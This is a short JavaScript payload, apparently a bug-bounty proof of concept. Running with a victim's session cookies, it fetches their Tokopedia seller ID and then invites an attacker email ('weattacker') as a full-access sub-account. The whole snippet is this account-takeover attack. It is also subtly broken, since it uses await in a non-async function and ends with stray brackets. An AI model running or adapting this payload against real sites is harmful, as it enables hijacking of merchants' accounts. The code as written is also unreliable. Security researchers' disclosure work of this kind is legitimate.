(function(path, headers) {
  const response = await fetch('https://seller-id.tokopedia.com/api/v3/seller/common/get',{"credentials": "include"});
    if (!response.ok) {
      throw new Error(`请求失败: ${response.status}`);
    }
    const result = await response.json();
    const sellerId = result.data?.seller?.seller_id;
    if (sellerId) {
      fetch("https://seller-id.tokopedia.com/api/v1/seller/account_management/invite?locale=en&language=en", {
          "headers": {
            "accept": "*/*",
            "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "credentials": "include", 
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "tt-ticket-guard-version": "2",
            "tt-ticket-guard-web-version": "1",
            "x-tt-oec-region": "ID"
          },
          "referrer": "https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user",
          "body": JSON.stringify({global_seller_roles:[{global_seller_id:sellerId,roles:[{identifier:"subaccount_role_full_access"}]}],seller_roles:[],default_language:"en",email:"esperamier+2@bugcrowdninja.com",mobile:"",user_name:"weattacker"}),
          "method": "POST",
          "mode": "cors",
          "credentials": "include"
        });
    } else {
      throw new Error('未找到 seller_id 字段');
    }
  
  return {path: path, headers: headers};
})
                        })
